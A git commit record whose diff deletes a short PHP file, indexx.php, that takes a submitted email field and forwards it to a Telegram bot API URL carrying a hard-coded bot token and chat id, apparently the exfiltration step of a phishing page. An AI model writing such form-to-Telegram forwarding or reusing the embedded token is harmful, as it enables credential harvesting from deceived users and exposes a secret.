8a8300d3f824453fbd0dfea2d983f5cad1540cdd
AI22AK47 <94799989+AI22AK47@users.noreply.github.com>
2022-11-08 22:24:02 +0600

    Delete indexx.php

--- indexx.php
+++
@@ -1,6 +0,0 @@
-<?php
-    if(isset($_POST['submit']))
-    $text=$_POST["email"];
-        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text");    
-    
-?>
